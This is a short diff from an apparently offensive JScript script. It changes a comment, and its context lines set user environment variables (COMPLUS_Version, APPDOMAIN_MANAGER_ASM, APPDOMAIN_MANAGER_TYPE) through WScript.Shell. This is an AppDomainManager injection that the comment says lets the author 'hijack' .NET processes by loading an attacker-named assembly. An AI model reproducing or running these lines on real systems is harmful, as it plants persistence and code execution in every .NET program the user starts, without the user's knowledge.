@@ -37,7 +37,7 @@ Identify the scope of the activity.
 
 // var manifest string should be UTF-16
 // Controls the search path for unmanged dlls
-// Environment Variables By Setting Up For User we can Hijack all .NET Processes :) 
+// Environment Variables By Setting Up For User we can Hijack and probably break many .NET Processes :) 
 new ActiveXObject('WScript.Shell').Environment('User')('COMPLUS_Version') = 'v4.0.30319';
 new ActiveXObject('WScript.Shell').Environment('User')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
 new ActiveXObject('WScript.Shell').Environment('User')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';
